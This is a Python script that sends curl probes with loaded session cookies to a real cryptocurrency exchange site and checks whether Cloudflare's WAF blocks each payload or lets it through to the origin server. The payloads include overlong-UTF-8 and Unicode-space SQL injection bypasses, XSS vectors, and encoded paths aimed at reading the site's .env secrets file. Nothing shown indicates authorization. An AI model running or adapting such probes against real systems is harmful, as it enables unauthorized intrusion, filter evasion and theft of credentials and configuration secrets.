import subprocess

BASE = "https://bitcoinvn.io"
pairs = []
for line in open("/workspace/jar.txt"):
    line = line.rstrip("\n")
    if not line.strip(): continue
    if line.startswith("#HttpOnly_"): line = line[len("#HttpOnly_"):]
    if line.startswith("#"): continue
    f = line.split("\t")
    pairs.append(f"{f[5]}={f[6]}")
CJ = "; ".join(pairs)
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def probe(path):
    cmd = ["curl", "-s", "-D", "/tmp/h3.txt", "-o", "/dev/null", "--max-time", "12",
           "-H", f"Cookie: {CJ}", "-H", f"User-Agent: {UA}", "--path-as-is", BASE + path]
    subprocess.run(cmd, capture_output=True, text=True, timeout=20)
    raw = open("/tmp/h3.txt").read()
    first = raw.split("\r\n")[0]
    code = first.split(" ")[1] if len(first.split(" ")) > 1 else "?"
    src = "ORIGIN" if "content-security-policy:" in raw.lower() else "CF-EDGE"
    return code, src

tests = [
 # confirm case-insensitivity of overlong bypass + isolate the discriminator
 ("overlong lower %c0%af   ", "/?q=union%c0%afselect"),
 ("overlong upper %C0%AF   ", "/?q=union%C0%AFselect"),
 ("overlong mixed %C0%af   ", "/?q=union%C0%afselect"),
 ("overlong E0809F alt     ", "/?q=union%E0%80%9Fselect"),
 ("overlong between words  ", "/?q=un%C0%AFion%C0%AFselect"),
 ("overlong inside word    ", "/?q=u%C0%Anion select"),
 ("zwsp between words      ", "/?q=union%E2%80%8Bselect"),
 ("zwj %e2%80%8d           ", "/?q=union%E2%80%8Dselect"),
 ("nbsp %c2%a0             ", "/?q=union%C2%A0select"),
 ("thin space %e2%80%af    ", "/?q=union%E2%80%AFselect"),
 ("ogham sp %e1%8d%a0      ", "/?q=union%E1%8D%A0select"),
 # SQLi keyword variants - does CF need BOTH tokens or just one with sql context?
 ("or 1=1                  ", "/?q=or%201%3D1"),
 ("union all select        ", "/?q=union%20all%20select"),
 ("union/**/select comment ", "/?q=union/**/select"),
 ("union%23select hash     ", "/?q=union%23select"),
 ("seLenT case mix         ", "/?q=unIoN%20SeLeCt"),
 # XSS compact agnostic vectors
 ("xss <scr<script>ipt> split","/?v=%3Cscr%3Cscript%3Eipt%3E"),
 ("xss svg animates       ", "/?v=%3Csvg%3E%3Canimate%20onbegin%3Dalert(1)%3E"),
 ("xss img srcset no onerr", "/?v=%3Cimg%20src%3Dx%20srcset%3Dy%3E"),
 ("xss math href          ", "/?v=%3Cmath%3E%3Cmglyph%3E"),
 ("xss form action        ", "/?v=%3Cform%20action%3Djavascript:x%3E"),
 ("xss noscript style     ", "/?v=%3Cnoscript%3E%3Cstyle%3E"),
 ("xss title script leak  ", "/?v=%3Ctitle%3E%3C/script%3E"),
 ("xss iframe srcdoc      ", "/?v=%3Ciframe%20srcdoc%3Dx%3E"),
 ("xss template slot      ", "/?v=%3Ctemplate%3E%3Cslot%3E"),
 # dotfile compact encodings
 ("dot utf16 .env         ", "/.%00env"),
 ("dot percent-in-percent ", "/%252eenv"),
 ("dot unicode fullwidth d","/%EF%BC%AEenv"),
 ("dot .env;sysprop       ", "/.env;sysprop"),
 ("dot .env::$DATA        ", "/.env::$DATA"),
 ("dot ..%3B.env          ", "/..%3B/.env"),
 ("dot double slash       ", "//.env"),
 ("dot backslash          ", "/\\.env"),
 ("dot tab in name        ", "/.%09env"),
 ("dot crlf in name       ", "/.%0d%0aenv"),
]

print(f"{'TEST':<28} {'CODE':<5} RESULT")
print("-"*50)
for label, p in tests:
    c, s = probe(p)
    flag = "BLOCKED-BY-WAF" if s == "CF-EDGE" else "REACHED-ORIGIN"
    print(f"{label:<28} {c:<5} {flag}")
